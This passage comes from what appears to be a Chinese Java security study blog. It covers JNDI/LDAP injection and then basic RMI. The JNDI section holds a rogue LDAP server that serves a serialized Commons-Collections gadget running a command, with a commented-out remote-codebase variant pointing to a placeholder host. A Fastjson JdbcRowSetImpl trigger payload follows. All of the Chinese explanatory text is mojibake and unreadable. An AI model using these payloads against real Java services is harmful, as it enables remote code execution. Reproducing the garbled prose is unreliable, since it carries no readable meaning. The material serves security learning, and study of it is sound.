com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.Entry;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPException;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;<br><span class="hljs-keyword">import</span> com.unboundid.ldap.sdk.ResultCode;<br><br><span class="hljs-keyword">import</span> javax.net.ServerSocketFactory;<br><span class="hljs-keyword">import</span> javax.net.SocketFactory;<br><span class="hljs-keyword">import</span> javax.net.ssl.SSLSocketFactory;<br><span class="hljs-keyword">import</span> java.net.InetAddress;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.text.ParseException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetServer</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LDAP_BASE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dc=example,dc=com&quot;</span>;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://vps:8000/#ExportObject&quot;</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">1234</span>;<br><br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">InMemoryDirectoryServerConfig</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);<br>            config.setListenerConfigs(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryListenerConfig</span>(<br>                <span class="hljs-string">&quot;listen&quot;</span>,<br>                InetAddress.getByName(<span class="hljs-string">&quot;0.0.0.0&quot;</span>),<br>                port,<br>                ServerSocketFactory.getDefault(),<br>                SocketFactory.getDefault(),<br>                (SSLSocketFactory) SSLSocketFactory.getDefault()));<br><br>            config.addInMemoryOperationInterceptor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">OperationInterceptor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(url)));<br>            <span class="hljs-type">InMemoryDirectoryServer</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryDirectoryServer</span>(config);<br>            System.out.println(<span class="hljs-string">&quot;Listening on 0.0.0.0:&quot;</span> + port);<br>            ds.startListening();<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OperationInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">InMemoryOperationInterceptor</span> &#123;<br><br>        <span class="hljs-keyword">private</span> URL codebase;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * */</span> <span class="hljs-keyword">public</span> <span class="hljs-title function_">OperationInterceptor</span> <span class="hljs-params">( URL cb )</span> &#123;<br>            <span class="hljs-built_in">this</span>.codebase = cb;<br>        &#125;<br><br><br>        <span class="hljs-comment">/**</span><br><span class="hljs-comment">         * &#123;<span class="hljs-doctag">@inheritDoc</span>&#125;</span><br><span class="hljs-comment">         * * <span class="hljs-doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)</span><br><span class="hljs-comment">         */</span> <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">processSearchResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result )</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">base</span> <span class="hljs-operator">=</span> result.getRequest().getBaseDN();<br>            <span class="hljs-type">Entry</span> <span class="hljs-variable">e</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>(base);<br>            <span class="hljs-keyword">try</span> &#123;<br>                sendResult(result, base, e);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( Exception e1 ) &#123;<br>                e1.printStackTrace();<br>            &#125;<br><br>        &#125;<br><br><br>        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendResult</span> <span class="hljs-params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="hljs-keyword">throws</span> LDAPException, MalformedURLException &#123;<br>            <span class="hljs-type">URL</span> <span class="hljs-variable">turl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-built_in">this</span>.codebase, <span class="hljs-built_in">this</span>.codebase.getRef().replace(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>).concat(<span class="hljs-string">&quot;.class&quot;</span>));<br>            System.out.println(<span class="hljs-string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="hljs-string">&quot; redirecting to &quot;</span> + turl);<br>            e.addAttribute(<span class="hljs-string">&quot;javaClassName&quot;</span>, <span class="hljs-string">&quot;Exploit&quot;</span>);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cbstring</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.codebase.toString();<br>            <span class="hljs-type">int</span> <span class="hljs-variable">refPos</span> <span class="hljs-operator">=</span> cbstring.indexOf(<span class="hljs-string">&#x27;#&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ( refPos &gt; <span class="hljs-number">0</span> ) &#123;<br>                cbstring = cbstring.substring(<span class="hljs-number">0</span>, refPos);<br>            &#125;<br><br>            <span class="hljs-comment">// Payload1: åˆ©ç”¨LDAP+Reference Factory  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaCodeBase&quot;, cbstring);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;objectClass&quot;, &quot;javaNamingReference&quot;);  </span><br><span class="hljs-comment">//            e.addAttribute(&quot;javaFactory&quot;, this.codebase.getRef());  </span><br><br>            <span class="hljs-comment">// Payload2: è¿”å›åºåˆ—åŒ–Gadget</span><br>            <span class="hljs-keyword">try</span> &#123;<br>                e.addAttribute(<span class="hljs-string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="hljs-string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));<br>            &#125; <span class="hljs-keyword">catch</span> (ParseException exception) &#123;<br>                exception.printStackTrace();<br>            &#125;<br><br>            result.sendSearchEntry(e);<br>            result.setResult(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDAPResult</span>(<span class="hljs-number">0</span>, ResultCode.SUCCESS));<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.InitialContext;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIGadgetClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// lookupå‚æ•°æ³¨å…¥è§¦å‘  </span><br>        <span class="hljs-type">Context</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        context.lookup(<span class="hljs-string">&quot;ldap://localhost:1234/ExportObject&quot;</span>);<br><br>        <span class="hljs-comment">// Fastjsonååºåˆ—åŒ–JNDIæ³¨å…¥Gadgetè§¦å‘</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1234/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119836.png"></p><h5 id="åˆ†æï¼š-1"><a href="#åˆ†æï¼š-1" class="headerlink" title="åˆ†æï¼š"></a>åˆ†æï¼š</h5><p>åœ¨è¿™é‡Œä¸‹æ–­ç‚¹è°ƒè¯•</p><p>é¦–å…ˆè¿˜æ˜¯ç»è¿‡ lookup çš„æ–¹æ³•è°ƒç”¨</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119597.png"></p><p><strong>InitialContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119493.png"></p><p><strong>ldapURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119211.png"></p><p><strong>ldapURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119982.png"></p><p><strong>GenericURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119690.png"></p><p><strong>GenericURLContext.lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119370.png"></p><p><strong>PartialCompositeContext.lookup.p_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119175.png"></p><p><strong>ComponentContext.p_lookup.c_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119759.png"></p><p><strong>LdapCtx.c_lookup</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119325.png"></p><p>ä»ä¸Šé¢æ˜¯é€šè¿‡ p_lookup.c_lookup è¿›å…¥åˆ°  <strong>decodeObject</strong> ä¸­ï¼Œè¿™é‡Œæ˜¯é‡ç‚¹è¦å…³æ³¨çš„ï¼Œ</p><p><strong>decodeObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119733.png"></p><p>è¿›å…¥ <strong>decodeObject</strong>ï¼Œå…ˆè¦è¿›å…¥ä¸€ä¸ª getURLClassLoader ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119691.png"></p><p>getURLClassLoader ä¸­çš„ trustURLCodebase é»˜è®¤æ˜¯ false ,ä¸æ‰§è¡Œ newInstance å®ä¾‹åŒ–ï¼Œè¿™é‡Œè™½ç„¶å·²ç»è·å–åˆ°å­—èŠ‚ç äº†ï¼Œåªæ˜¯ä¸å®ä¾‹åŒ–å°±æ— æ³•åŠ è½½ï¼Œä¹Ÿå°±æ— æ³•å‘½ä»¤æ‰§è¡Œã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242119731.png"></p><p>æ¥ç€å¾€ä¸‹èµ°ï¼Œæ¥åˆ°äº† deserializaObject ï¼Œ</p><p><strong>decodeObject.deserializaObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120786.png"></p><p>è€Œ deserializaObject å¯¹è±¡ä¸­æ°å¥½æœ‰ readObject ï¼Œå­—èŠ‚ç åœ¨æ­¤å¤„è¢«ååºåˆ—åŒ–é€ æˆæ¼æ´ã€‚</p><p><strong>deserializaObject.readObject</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120050.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242120465.png"></p><h1 id="å‚è€ƒæ–‡ç« ï¼š"><a href="#å‚è€ƒæ–‡ç« ï¼š" class="headerlink" title="å‚è€ƒæ–‡ç« ï¼š"></a>å‚è€ƒæ–‡ç« ï¼š</h1><p><a href="https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap">https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-Jndi-%E7%BB%93%E5%90%88-ldap</a></p><p><a href="http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/">http://101.36.122.13:4000/2025/03/08/JNDI%E4%B8%93%E9%A2%98/</a></p><p><a href="https://www.bilibili.com/video/BV1ct4y1h79t">https://www.bilibili.com/video/BV1ct4y1h79t</a></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI</title>
    <link href="/2025/09/20/RMI/"/>
    <url>/2025/09/20/RMI/</url>
    
    <content type="html"><![CDATA[<h2 id="1ã€RMIæ˜¯ä»€ä¹ˆ"><a href="#1ã€RMIæ˜¯ä»€ä¹ˆ" class="headerlink" title="1ã€RMIæ˜¯ä»€ä¹ˆ"></a>1ã€RMIæ˜¯ä»€ä¹ˆ</h2><blockquote><p>Java RMIç”¨äºä¸åŒè™šæ‹Ÿæœºä¹‹é—´çš„é€šä¿¡ï¼Œè¿™äº›è™šæ‹Ÿæœºå¯ä»¥åœ¨ä¸åŒçš„ä¸»æœºä¸Šã€ä¹Ÿå¯ä»¥åœ¨åŒä¸€ä¸ªä¸»æœºä¸Šï¼›ä¸€ä¸ªè™šæ‹Ÿæœºä¸­çš„å¯¹è±¡è°ƒç”¨å¦ä¸€ä¸ªè™šæ‹Ÿä¸Šä¸­çš„å¯¹è±¡çš„æ–¹æ³•ï¼Œåªä¸è¿‡æ˜¯å…è®¸è¢«è¿œç¨‹è°ƒç”¨çš„å¯¹è±¡è¦é€šè¿‡ä¸€äº›æ ‡å¿—åŠ ä»¥æ ‡è¯†ã€‚è¿™æ ·åšçš„ç‰¹ç‚¹å¦‚ä¸‹ï¼š</p><p>ä¼˜ç‚¹ï¼šé¿å…é‡å¤é€ è½®å­ï¼›</p><p>ç¼ºç‚¹ï¼šè°ƒç”¨è¿‡ç¨‹å¾ˆæ…¢ï¼Œè€Œä¸”è¯¥è¿‡ç¨‹æ˜¯ä¸å¯é çš„ï¼Œå®¹æ˜“å‘ç”Ÿä¸å¯é¢„æ–™çš„é”™è¯¯ï¼Œæ¯”å¦‚ç½‘ç»œé”™è¯¯ç­‰ï¼›</p><p>åœ¨RMIä¸­çš„æ ¸å¿ƒæ˜¯è¿œç¨‹å¯¹è±¡ï¼ˆremote objectï¼‰ï¼Œé™¤äº†å¯¹è±¡æœ¬èº«æ‰€åœ¨çš„è™šæ‹Ÿæœºï¼Œå…¶ä»–è™šæ‹Ÿæœºä¹Ÿå¯ä»¥è°ƒç”¨æ­¤å¯¹è±¡çš„æ–¹æ³•ï¼Œè€Œä¸”è¿™äº›è™šæ‹Ÿæœºå¯ä»¥ä¸åœ¨åŒä¸€ä¸ªä¸»æœºä¸Šã€‚æ¯ä¸ªè¿œç¨‹å¯¹è±¡éƒ½è¦å®ç°ä¸€ä¸ªæˆ–è€…å¤šä¸ªè¿œç¨‹æ¥å£æ¥æ ‡è¯†è‡ªå·±ï¼Œå£°æ˜äº†å¯ä»¥è¢«å¤–éƒ¨ç³»ç»Ÿæˆ–è€…åº”ç”¨è°ƒç”¨çš„æ–¹æ³•ï¼ˆå½“ç„¶ä¹Ÿæœ‰ä¸€äº›æ–¹æ³•æ˜¯ä¸æƒ³è®©äººè®¿é—®çš„ï¼‰ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png"></p><h2 id="2ã€RMI-åŸºæœ¬å®ç°"><a href="#2ã€RMI-åŸºæœ¬å®ç°" class="headerlink" title="2ã€RMI åŸºæœ¬å®ç°"></a>2ã€RMI åŸºæœ¬å®ç°</h2><h3 id="å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>, <span class="hljs-number">1099</span>);<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (IRemoteObj) registry.lookup(<span class="hljs-string">&quot;remoteObj&quot;</span>);<br>        remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æœåŠ¡ç«¯"><a href="#æœåŠ¡ç«¯" class="headerlink" title="æœåŠ¡ç«¯"></a>æœåŠ¡ç«¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObjImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">IRemoteObj</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RemoteObjImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">upKeywords</span> <span class="hljs-operator">=</span> keywords.toUpperCase();<br>        System.out.println(upKeywords);<br>        <span class="hljs-keyword">return</span> upKeywords;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.NotBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, AlreadyBoundException, NotBoundException &#123;<br>        <span class="hljs-type">IRemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        r.bind(<span class="hljs-string">&quot;remoteObj&quot;</span>, remoteObj);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>RMI å®¢æˆ·ç«¯é€šè¿‡è¿œç¨‹è°ƒç”¨æœåŠ¡ç«¯çš„ sayHello æ–¹æ³•ï¼ŒæˆåŠŸåœ¨æœåŠ¡ç«¯è¾“å‡ºäº†å¤§å†™çš„â€œHELLOâ€ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png"></p><h2 id="3ã€æµç¨‹åŸç†"><a href="#3ã€æµç¨‹åŸç†" class="headerlink" title="3ã€æµç¨‹åŸç†"></a>3ã€æµç¨‹åŸç†</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png"></p><h3 id="3-1-æœåŠ¡ç«¯-åˆ›å»ºè¿œç¨‹æœåŠ¡"><a href="#3-1-æœåŠ¡ç«¯-åˆ›å»ºè¿œç¨‹æœåŠ¡" class="headerlink" title="3.1 æœåŠ¡ç«¯-åˆ›å»ºè¿œç¨‹æœåŠ¡"></a>3.1 æœåŠ¡ç«¯-åˆ›å»ºè¿œç¨‹æœåŠ¡</h3><p>è°ƒè¯•åˆ†æè¿œç¨‹å¯¹è±¡çš„åˆ›å»ºè¿‡ç¨‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png"></p><p>è¿›å…¥å…¶æ„é€ å‡½æ•°ï¼Œ</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png"></p><p>**UnicastRemoteObject **ä¸­ ï¼Œport è¢«é»˜è®¤èµ‹å€¼ä¸º 0</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png"></p><p>æ­¥å…¥  UnicastRemoteObject  ç±»ä¸­çš„ <strong>exportObject</strong> ï¼ˆå§‘ä¸”ç§°ä¸ºå¯¼å‡ºå¯¹è±¡å‡½æ•°ï¼‰</p><ul><li><font style="color:#080808;background-color:#ffffff;">public static</font>ï¼šä¸éœ€è¦åˆ›å»º UnicastRemoteObject  